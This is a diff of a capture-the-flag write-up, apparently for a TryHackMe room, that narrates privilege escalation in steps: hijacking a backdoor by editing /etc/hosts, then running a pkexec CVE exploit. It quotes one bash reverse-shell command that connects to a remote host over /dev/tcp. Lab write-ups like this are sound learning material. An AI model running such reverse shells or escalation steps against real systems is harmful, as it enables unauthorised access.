@@ -23,6 +23,15 @@
 >	- Changing the permissions and running the file.![](pspy-out.png)
 >	- The `bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &` seems like a backdoor for privileged users, but the `redrules.thm` indicates an entry in the `/etc/hosts` file.
 >	- Checking the `/etc/hosts` file.![](hosts-file.png)
->	- Appending our own machine to the hosts file. ![](new-hosts.png)
->	- Using the backdoor to gain access.![](root-access.png)
->	- 
+## *Privilege Escalation*
+>	 - Appending our own machine to the hosts file. ![](new-hosts.png)
+>	- Using the backdoor to gain access.![](red-access.png)
+>	- The second flag can be found.![](flag-2.png)
+## *Enumeration v3*
+>	- Checking the home directory shows a `.git` directory.![](git-dir.png)
+>	- A quick google search on `pkexec` shows that it can be used to run programs as other users or root user if the username isn't provided.![](pkexec.png)
+>	- Another search for a CVE that exploits `pkexec`.![](pkexec-cve.png)
+## *Privilege Escalation v2*
+>	- Downloading the `.py` file and hosting it with python.
+>	- Downloading the file and running it on the target machine.![](root-access.png)
+>	- Final flag can be found.![](flag-3.png)
